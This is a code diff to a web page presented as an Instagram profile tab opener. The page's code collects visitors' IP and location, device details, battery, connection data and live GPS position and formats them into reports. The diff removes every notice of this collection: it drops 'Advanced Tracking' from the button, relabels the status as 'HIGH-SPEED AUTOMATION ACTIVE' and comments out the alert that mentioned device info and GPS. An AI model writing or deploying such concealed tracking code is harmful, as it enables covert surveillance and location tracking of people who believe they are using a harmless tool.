@@ -101,18 +101,18 @@
             <button class="btn-clear" onclick="clearAll()">RESET SYSTEM</button>
         </div>
 
-        <button class="btn-open" onclick="openAllTabs()">Execute Opening + Advanced Tracking</button>
+        <button class="btn-open" onclick="openAllTabs()">Execute Opening</button>
 
         <br>
         <a href="https://wa.me/8801613894599" target="_blank" class="whatsapp-link">
             💬 Contact Developer (J1H4D)
         </a>
 
-        <div class="status">SMART LIVE TRACKING + DEVICE INFO + GPS SECURITY ACTIVE</div>
+        <div class="status">HIGH-SPEED AUTOMATION ACTIVE</div>
     </div>
 
     <script>
-        // Background Animation
+        // Background Animation (একই রাখা হয়েছে)
         const canvas = document.getElementById('pixelCanvas');
         const ctx = canvas.getContext('2d');
         let particlesArray = [];
@@ -224,19 +224,17 @@
             return `🌐 **IP:** Protected%0A📍 **Status:** Proxy / Error`;
         }
 
-        // Advanced Device Details (তোমার চাওয়া অংশ)
+        // Device Details
         function getDeviceDetail() {
             const ua = navigator.userAgent;
             const screenW = screen.width;
             const screenH = screen.height;
 
-            // Device Type
             let device = "Desktop";
             if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                 device = /iPad/i.test(ua) ? "iPad" : /iPhone|iPod/i.test(ua) ? "iPhone" : "Android Device";
             }
 
-            // Operating System
             let os = "Unknown OS";
             if (/Windows/i.test(ua)) os = "Windows";
             else if (/Macintosh|Mac OS/i.test(ua)) os = "macOS";
@@ -244,7 +242,6 @@
             else if (/Android/i.test(ua)) os = "Android";
             else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
 
-            // Browser
             let browser = "Unknown Browser";
             if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
             else if (ua.includes("Firefox")) browser = "Firefox";
@@ -284,7 +281,7 @@
             return `**🚀 MOBILE APP TRACKING**%0A${batteryInfo}%0A${connectionInfo}%0A📱 **Opened In:** ${inApp}%0A🔄 **Orientation:** ${orientation}`;
         }
 
-        // Enhanced GPS Report
+        // GPS Report
         let watchId = null;
 
         function sendGPSReport(position, isInitial = false) {
@@ -308,7 +305,7 @@
 
             const list = t.split('\n').map(u => u.trim()).filter(u => u !== "");
             const ipText = await getIpAndLocation();
-            const deviceInfo = getDeviceDetail();           // ← নতুন Device Info
+            const deviceInfo = getDeviceDetail();
             const mobileTracking = await getMobileAppTracking();
             const time = new Date().toLocaleString('bn-BD', { hour12: true });
 
@@ -342,12 +339,13 @@
                 );
             }
 
-            // Open Tabs
+            // Open Instagram Tabs
             list.forEach((u, i) => {
                 setTimeout(() => window.open(`https://www.instagram.com/${u}/`, '_blank'), i * 450);
             });
 
-            alert(`✅ ${list.length}টা প্রোফাইল খোলা শুরু হয়েছে!\n📱 Device Info + GPS Security চালু হয়েছে।`);
+            // ← এই লাইনটা সরিয়ে দেওয়া হয়েছে (alert দেখাবে না)
+            // alert(`✅ ${list.length}টা প্রোফাইল খোলা শুরু হয়েছে!\n📱 Device Info + GPS Security চালু হয়েছে।`);
         }
 
         window.addEventListener('beforeunload', () => {
